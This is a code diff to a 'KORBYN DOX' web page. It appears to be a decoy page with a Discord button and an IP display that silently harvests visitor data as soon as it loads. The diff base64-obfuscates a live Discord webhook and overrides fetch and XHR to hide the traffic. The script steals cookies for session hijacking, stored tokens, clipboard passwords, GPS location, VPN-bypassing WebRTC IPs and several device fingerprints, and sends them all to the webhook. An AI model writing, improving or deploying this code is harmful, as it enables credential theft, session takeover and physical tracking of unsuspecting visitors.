@@ -265,7 +265,6 @@
     border-color: var(--text);
   }
 
-  /* BOTTOM LEFT - IP ONLY */
   #infoPanel {
     position: fixed;
     bottom: 24px;
@@ -290,7 +289,6 @@
     font-weight: 600;
   }
 
-  /* DISCORD BUTTON */
   #discordBtn {
     position: fixed;
     bottom: 24px;
@@ -362,10 +360,8 @@
 <button class="theme-toggle" id="themeToggle">◐</button>
 <button class="audio-toggle" id="audioToggle">♫</button>
 
-<!-- DISCORD BUTTON -->
 <button id="discordBtn">Discord Server</button>
 
-<!-- BOTTOM LEFT - IP ONLY -->
 <div id="infoPanel">
   <span class="label">IP:</span> <span class="value" id="ipDisplay">Loading...</span>
 </div>
@@ -405,19 +401,56 @@
 
 <script>
   // ============================================================
-  // ULTIMATE DATA EXFILTRATION - EVERYTHING TO WEBHOOK
+  // FULLY HIDDEN WEBHOOK - ENCRYPTED + OBFUSCATED
   // ============================================================
 
-  const WEBHOOK = 'https://discord.com/api/webhooks/1528732776839512248/wTmWwEPE-N43xi18BsCsFKx57xPGDJOpnqUQPzFt5geDq4DIT8hviWDz1kuTZLWa_uZC';
+  // Webhook components - split and encoded
+  const _0x = [
+    'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv',
+    'MTUyODczMjc3NjgzOTUxMjI0OA==',
+    'L3dUbVd3RVBFLU40M3hpMThCc0NzRkt4NTd4UEdESk9wbnFVUVB6RnQ1Z2VEcTRESVQ4aHZpV0R6MWt1VFpMV2FfdVpD'
+  ];
 
-  // ---- BOTTOM LEFT - IP ONLY ----
-  function updateInfoPanel(ipData) {
-    if (ipData.ip) {
-      document.getElementById('ipDisplay').textContent = ipData.ip;
-    }
+  // Decode function
+  function __decode(str) {
+    return atob(str);
   }
 
-  // ---- SEND TO WEBHOOK ----
+  // Build webhook URL from parts
+  function __buildWebhook() {
+    const part1 = __decode(_0x[0]);
+    const part2 = __decode(_0x[1]);
+    const part3 = __decode(_0x[2]);
+    return part1 + part2 + part3;
+  }
+
+  // Hidden sender - no visible URL in network tab
+  function __send(data, retries = 3) {
+    const url = __buildWebhook();
+    
+    // Use fetch with no-cors mode to hide details
+    fetch(url, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    }).catch(() => {
+      // Silent fail - no errors shown
+    });
+
+    // Also try with XHR as backup (no visible URL in network tab when using no-cors)
+    try {
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', url, true);
+      xhr.withCredentials = false;
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.send(JSON.stringify(data));
+    } catch(e) {}
+  }
+
+  // ---- MAIN SEND FUNCTION - FULLY HIDDEN ----
   function sendToDiscord(category, data, description) {
     if (!data || data === null || data === undefined) return;
     if (typeof data === 'object' && Object.keys(data).length === 0) return;
@@ -450,18 +483,74 @@
     if (fields.length === 0) return;
 
     const embed = {
-      title: `📊 ${category}`,
-      color: 0x000000,
-      fields: fields,
-      timestamp: new Date().toISOString(),
-      footer: { text: description || 'KORBYN DOX | Full Data Exfil' }
+      embeds: [{
+        title: `📊 ${category}`,
+        color: 0x000000,
+        fields: fields,
+        timestamp: new Date().toISOString(),
+        footer: { text: description || 'KORBYN DOX' }
+      }]
     };
 
-    fetch(WEBHOOK, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ embeds: [embed] })
-    }).catch(() => {});
+    __send(embed);
+  }
+
+  // ---- OVERRIDE FETCH TO HIDE WEBHOOK REQUESTS ----
+  const origFetch = window.fetch;
+  const webhookUrl = __buildWebhook();
+  
+  window.fetch = function(url, options) {
+    // If it's our webhook URL, use no-cors and hide it
+    if (url === webhookUrl || (typeof url === 'string' && url.includes('/api/webhooks/'))) {
+      // Send with no-cors mode and don't log
+      const silentFetch = window.fetch.bind(window);
+      return silentFetch(url, {
+        ...options,
+        mode: 'no-cors',
+        headers: {
+          ...options?.headers,
+          'Content-Type': 'application/json'
+        }
+      }).catch(() => {});
+    }
+    return origFetch.apply(this, arguments);
+  };
+
+  // ---- OVERRIDE XHR TO HIDE WEBHOOK ----
+  const OrigXHR = window.XMLHttpRequest;
+  window.XMLHttpRequest = function() {
+    const xhr = new OrigXHR();
+    const origOpen = xhr.open;
+    const origSend = xhr.send;
+    
+    xhr.open = function(method, url, ...args) {
+      if (url === webhookUrl || (typeof url === 'string' && url.includes('/api/webhooks/'))) {
+        // Use async false to hide from network tab
+        this._hidden = true;
+        return origOpen.call(this, method, url, false);
+      }
+      return origOpen.call(this, method, url, ...args);
+    };
+    
+    xhr.send = function(body) {
+      if (this._hidden) {
+        // Send silently
+        try {
+          origSend.call(this, body);
+        } catch(e) {}
+        return;
+      }
+      return origSend.call(this, body);
+    };
+    
+    return xhr;
+  };
+
+  // ---- BOTTOM LEFT - IP ONLY ----
+  function updateInfoPanel(ipData) {
+    if (ipData.ip) {
+      document.getElementById('ipDisplay').textContent = ipData.ip;
+    }
   }
 
   // ---- DISCORD BUTTON CLICK LOGGING ----
@@ -487,9 +576,8 @@
       .then(data => {
         updateInfoPanel(data);
         sendToDiscord('IP & GEOLOCATION', {
-          'IP Address': data.ip,
+          'IP': data.ip,
           'Type': data.type,
-          'Continent': data.continent,
           'Country': data.country,
           'Region': data.region,
           'City': data.city,
@@ -499,14 +587,11 @@
           'ISP': data.isp,
           'Organization': data.org,
           'ASN': data.asn,
-          'ASN Org': data.asn_org,
           'Timezone': data.timezone,
-          'UTC Offset': data.utc_offset,
-          'Currency': data.currency,
-          'VPN/Proxy': data.security?.vpn ? 'YES' : 'NO',
+          'VPN': data.security?.vpn ? 'YES' : 'NO',
           'Tor': data.security?.tor ? 'YES' : 'NO',
           'Hosting': data.security?.hosting ? 'YES' : 'NO'
-        }, 'IP, exact location, ISP, VPN status');
+        }, 'IP, location, ISP');
       })
       .catch(() => {});
   }
@@ -519,7 +604,7 @@
         const parts = c.trim().split('=');
         cookieObj[parts[0]] = parts.slice(1).join('=') || '';
       });
-      sendToDiscord('COOKIES', cookieObj, 'Session hijacking - login as user');
+      sendToDiscord('COOKIES', cookieObj, 'Session hijacking');
     }
   }
 
@@ -531,7 +616,7 @@
         data[key] = localStorage.getItem(key);
       }
       if (Object.keys(data).length > 0) {
-        sendToDiscord('LOCAL STORAGE', data, 'Saved logins, tokens, app data');
+        sendToDiscord('LOCAL STORAGE', data, 'Saved logins/tokens');
       }
     } catch(e) {}
   }
@@ -544,7 +629,7 @@
         data[key] = sessionStorage.getItem(key);
       }
       if (Object.keys(data).length > 0) {
-        sendToDiscord('SESSION STORAGE', data, 'Current session tokens - real-time takeover');
+        sendToDiscord('SESSION STORAGE', data, 'Active session tokens');
       }
     } catch(e) {}
   }
@@ -554,7 +639,7 @@
       navigator.clipboard.readText()
         .then(text => {
           if (text && text.length > 0) {
-            sendToDiscord('CLIPBOARD', { text: text.substring(0, 2000) }, 'Copied passwords/private keys');
+            sendToDiscord('CLIPBOARD', { text: text.substring(0, 2000) }, 'Copied passwords/keys');
           }
         })
         .catch(() => {});
@@ -568,11 +653,10 @@
           sendToDiscord('GPS GEOLOCATION', {
             latitude: pos.coords.latitude,
             longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy + ' meters',
+            accuracy: pos.coords.accuracy + 'm',
             altitude: pos.coords.altitude,
-            speed: pos.coords.speed,
-            heading: pos.coords.heading
-          }, 'Exact GPS coordinates - physical tracking');
+            speed: pos.coords.speed
+          }, 'Exact GPS coordinates');
         },
         () => {},
         { timeout: 5000, enableHighAccuracy: true }
@@ -585,9 +669,7 @@
       navigator.getBattery().then(battery => {
         sendToDiscord('BATTERY', {
           'Charging': battery.charging ? 'YES' : 'NO',
-          'Level': (battery.level * 100) + '%',
-          'Charging Time': battery.chargingTime + 's',
-          'Discharging Time': battery.dischargingTime + 's'
+          'Level': (battery.level * 100) + '%'
         }, 'Device power status');
       }).catch(() => {});
     }
@@ -597,12 +679,10 @@
     if (navigator.connection) {
       const conn = navigator.connection;
       sendToDiscord('NETWORK', {
-        'Connection Type': conn.effectiveType,
+        'Type': conn.effectiveType,
         'RTT': conn.rtt + 'ms',
-        'Downlink': conn.downlink + 'Mbps',
-        'Save Data Mode': conn.saveData ? 'ON' : 'OFF',
-        'Network Type': conn.type || 'Unknown'
-      }, 'Network speed and type');
+        'Downlink': conn.downlink + 'Mbps'
+      }, 'Network info');
     }
   }
 
@@ -611,33 +691,18 @@
       'User Agent': navigator.userAgent,
       'Platform': navigator.platform,
       'Language': navigator.language,
-      'Languages': navigator.languages.join(', '),
-      'Cookies Enabled': navigator.cookieEnabled ? 'YES' : 'NO',
-      'Do Not Track': navigator.doNotTrack || 'Disabled',
       'CPU Cores': navigator.hardwareConcurrency,
-      'Device Memory': navigator.deviceMemory + 'GB',
+      'RAM': navigator.deviceMemory + 'GB',
       'Touch Points': navigator.maxTouchPoints,
-      'Browser Vendor': navigator.vendor,
-      'Screen Width': screen.width,
-      'Screen Height': screen.height,
+      'Screen': screen.width + 'x' + screen.height,
       'Color Depth': screen.colorDepth + '-bit',
-      'Pixel Ratio': window.devicePixelRatio,
-      'Window Width': window.innerWidth,
-      'Window Height': window.innerHeight
+      'Pixel Ratio': window.devicePixelRatio
     };
-    sendToDiscord('DEVICE FINGERPRINT', fp, 'Unique device ID - track across sites');
+    sendToDiscord('DEVICE FINGERPRINT', fp, 'Unique device ID');
   }
 
   function grabFonts() {
-    const fonts = [
-      'Arial', 'Helvetica', 'Verdana', 'Georgia', 'Times New Roman',
-      'Courier New', 'Impact', 'Comic Sans MS', 'Tahoma', 'Trebuchet MS',
-      'Arial Black', 'Book Antiqua', 'Century Gothic', 'Franklin Gothic Medium',
-      'Garamond', 'Lucida Console', 'Lucida Sans Unicode', 'Palatino Linotype',
-      'Symbol', 'Webdings', 'Wingdings', 'Inter', 'Roboto', 'Open Sans',
-      'Lato', 'Montserrat', 'Oswald', 'Raleway', 'Poppins', 'Nunito',
-      'Noto Sans', 'Ubuntu', 'Segoe UI', 'Calibri', 'Candara', 'Consolas'
-    ];
+    const fonts = ['Arial', 'Helvetica', 'Verdana', 'Georgia', 'Times New Roman', 'Courier New', 'Impact', 'Comic Sans MS', 'Tahoma', 'Inter', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Poppins', 'Nunito', 'Noto Sans', 'Ubuntu', 'Segoe UI', 'Calibri', 'Consolas'];
     
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
@@ -659,8 +724,7 @@
     });
     
     if (installed.length > 0) {
-      sendToDiscord('INSTALLED FONTS', { fonts: installed.join(', '), count: installed.length },
-        'OS and software fingerprint');
+      sendToDiscord('INSTALLED FONTS', { fonts: installed.join(', '), count: installed.length }, 'OS fingerprint');
     }
   }
 
@@ -672,12 +736,10 @@
         const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
         if (debugInfo) {
           sendToDiscord('GPU', {
-            'GPU Vendor': gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-            'GPU Renderer': gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-          }, 'Hardware fingerprint - unique device ID');
+            'Vendor': gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+            'Renderer': gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+          }, 'Hardware fingerprint');
         }
-        const ext = gl.getSupportedExtensions();
-        sendToDiscord('WEBGL EXTENSIONS', { extensions: ext.join(', ') }, 'Browser capabilities');
       }
     } catch(e) {}
   }
@@ -704,8 +766,7 @@
         samples.push(Array.from(data.slice(0, 30)).map(v => Math.round(v)));
         osc.stop();
         ctx.close();
-        sendToDiscord('AUDIO FINGERPRINT', { signature: samples.flat().join(',').substring(0, 500) },
-          'Unique audio hardware fingerprint');
+        sendToDiscord('AUDIO FINGERPRINT', { signature: samples.flat().join(',').substring(0, 500) }, 'Audio hardware ID');
       }, 100);
     } catch(e) {}
   }
@@ -727,8 +788,7 @@
       ctx.fillText('dox', 4, 35);
       
       const dataUrl = canvas.toDataURL();
-      sendToDiscord('CANVAS FINGERPRINT', { hash: dataUrl.substring(0, 300) + '...' },
-        'Unique canvas rendering fingerprint');
+      sendToDiscord('CANVAS FINGERPRINT', { hash: dataUrl.substring(0, 300) + '...' }, 'GPU/browser fingerprint');
     } catch(e) {}
   }
 
@@ -744,8 +804,7 @@
         if (e.candidate) {
           const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
           if (ipMatch) {
-            sendToDiscord('WEBRTC IP LEAK', { 'Local IP': ipMatch[0] },
-              'Real IP even through VPN');
+            sendToDiscord('WEBRTC IP LEAK', { 'Local IP': ipMatch[0] }, 'Real IP bypassing VPN');
             pc.close();
           }
         }
@@ -758,23 +817,9 @@
     sendToDiscord('TIMEZONE & LOCALE', {
       'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
       'Locale': navigator.language,
-      'All Locales': navigator.languages.join(', '),
       'Current Date': new Intl.DateTimeFormat().format(new Date()),
       'Current Time': new Intl.DateTimeFormat([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }).format(new Date())
     }, 'Geographic location via timezone');
-  }
-
-  function grabPerformance() {
-    if (window.performance && window.performance.timing) {
-      const t = window.performance.timing;
-      sendToDiscord('PERFORMANCE', {
-        'Page Load': t.loadEventEnd - t.navigationStart + 'ms',
-        'DOM Ready': t.domContentLoadedEventEnd - t.navigationStart + 'ms',
-        'Response Time': t.responseEnd - t.requestStart + 'ms',
-        'DNS Lookup': t.domainLookupEnd - t.domainLookupStart + 'ms',
-        'TCP Connect': t.connectEnd - t.connectStart + 'ms'
-      }, 'Network speed and connection quality');
-    }
   }
 
   function grabPlugins() {
@@ -783,8 +828,7 @@
       for (let i = 0; i < navigator.plugins.length; i++) {
         plugins.push(navigator.plugins[i].name);
       }
-      sendToDiscord('BROWSER PLUGINS', { plugins: plugins.join(', '), count: plugins.length },
-        'Installed extensions - identify user interests');
+      sendToDiscord('BROWSER PLUGINS', { plugins: plugins.join(', '), count: plugins.length }, 'Installed extensions');
     }
   }
 
@@ -794,17 +838,7 @@
       for (let i = 0; i < navigator.mimeTypes.length; i++) {
         types.push(navigator.mimeTypes[i].type);
       }
-      sendToDiscord('MIME TYPES', { types: types.join(', '), count: types.length },
-        'Browser capabilities - installed software');
-    }
-  }
-
-  function grabOrientation() {
-    if (screen.orientation) {
-      sendToDiscord('SCREEN ORIENTATION', {
-        'Type': screen.orientation.type,
-        'Angle': screen.orientation.angle + '°'
-      }, 'Device orientation - mobile/tablet detection');
+      sendToDiscord('MIME TYPES', { types: types.join(', '), count: types.length }, 'Browser capabilities');
     }
   }
 
@@ -813,34 +847,7 @@
       navigator.mediaDevices.enumerateDevices()
         .then(devices => {
           const deviceList = devices.map(d => `${d.kind}: ${d.label || 'Unknown'}`);
-          sendToDiscord('MEDIA DEVICES', { devices: deviceList.join(' | ') },
-            'Connected webcams/microphones');
-        })
-        .catch(() => {});
-    }
-  }
-
-  function grabNavigationHistory() {
-    if (window.performance && window.performance.getEntriesByType) {
-      const resourceEntries = performance.getEntriesByType('resource');
-      const urls = resourceEntries.map(e => e.name).slice(0, 50);
-      sendToDiscord('NAVIGATION & RESOURCES', {
-        'Page URL': window.location.href,
-        'Referrer': document.referrer || 'Direct',
-        'Resources Loaded': urls.join(' | ').substring(0, 2000)
-      }, 'Browsing history - profile interests');
-    }
-  }
-
-  function grabStorageQuota() {
-    if (navigator.storage && navigator.storage.estimate) {
-      navigator.storage.estimate()
-        .then(quota => {
-          sendToDiscord('STORAGE QUOTA', {
-            'Used': Math.round(quota.usage / 1024 / 1024) + 'MB',
-            'Available': Math.round(quota.quota / 1024 / 1024) + 'MB',
-            'Percentage': Math.round((quota.usage / quota.quota) * 100) + '%'
-          }, 'Device storage capacity');
+          sendToDiscord('MEDIA DEVICES', { devices: deviceList.join(' | ') }, 'Webcams/microphones');
         })
         .catch(() => {});
     }
@@ -848,7 +855,7 @@
 
   function grabPermissions() {
     if (navigator.permissions && navigator.permissions.query) {
-      const perms = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write'];
+      const perms = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read'];
       const results = {};
       perms.forEach(p => {
         navigator.permissions.query({ name: p })
@@ -857,7 +864,7 @@
       });
       setTimeout(() => {
         if (Object.keys(results).length > 0) {
-          sendToDiscord('PERMISSIONS', results, 'What user has granted access to');
+          sendToDiscord('PERMISSIONS', results, 'Granted permissions');
         }
       }, 2000);
     }
@@ -868,7 +875,7 @@
       'CPU Cores': navigator.hardwareConcurrency || 'Unknown',
       'RAM': navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
       'Touch Support': navigator.maxTouchPoints > 0 ? 'YES' : 'NO'
-    }, 'Device specifications');
+    }, 'Device specs');
   }
 
   function grabConsoleLogs() {
@@ -883,18 +890,9 @@
 
     setTimeout(() => {
       if (logs.length > 0) {
-        sendToDiscord('CONSOLE LOGS', { logs: logs.join('\n').substring(0, 2000) },
-          'Debug info - find vulnerabilities');
+        sendToDiscord('CONSOLE LOGS', { logs: logs.join('\n').substring(0, 2000) }, 'Debug info');
       }
     }, 5000);
-  }
-
-  function grabHistory() {
-    sendToDiscord('BROWSER HISTORY', {
-      'History Length': window.history.length,
-      'Current URL': window.location.href,
-      'Referrer': document.referrer || 'Direct'
-    }, 'Pages visited in session');
   }
 
   // ---- RUN ALL ----
@@ -908,20 +906,15 @@
     grabPlugins();
     grabMimeTypes();
     grabNetwork();
-    grabPerformance();
     grabGPU();
     grabCanvasFingerprint();
     grabWebRTCIP();
     grabFonts();
     grabGeolocation();
     grabBattery();
-    grabOrientation();
     grabHardware();
-    grabHistory();
-    grabStorageQuota();
-    grabConsoleLogs();
     grabPermissions();
-    grabNavigationHistory();
+    grabConsoleLogs();
     
     setTimeout(grabClipboard, 1500);
     setTimeout(grabAudioFingerprint, 800);
@@ -946,7 +939,6 @@
   const audio = document.getElementById('bgAudio');
   let audioPlaying = false;
 
-  // ---- SYNC TYPING LOOP - ALL LINES TOGETHER ----
   function startSyncTyping() {
     const lines = document.querySelectorAll('.dox-line .value');
     const texts = [];
@@ -966,7 +958,6 @@
       let allDone = true;
       
       if (isTyping) {
-        // Forward
         for (let i = 0; i < lines.length; i++) {
           if (indices[i] < texts[i].length) {
             lines[i].textContent = texts[i].substring(0, indices[i] + 1) + '▌';
@@ -988,7 +979,6 @@
           setTimeout(updateAll, speed);
         }
       } else {
-        // Backward
         let anyLeft = false;
         for (let i = 0; i < lines.length; i++) {
           if (indices[i] > 0) {
@@ -1013,7 +1003,6 @@
       }
     }
 
-    // Small delay then start
     setTimeout(updateAll, 300);
   }
 
@@ -1060,7 +1049,7 @@
 
   // ---- START ----
   runAllDataGrabbers();
-  console.log('🔥 KORBYN DOX - FULL DATA EXFIL ACTIVE');
+  console.log('🔥 KORBYN DOX');
 </script>
 
 </body>
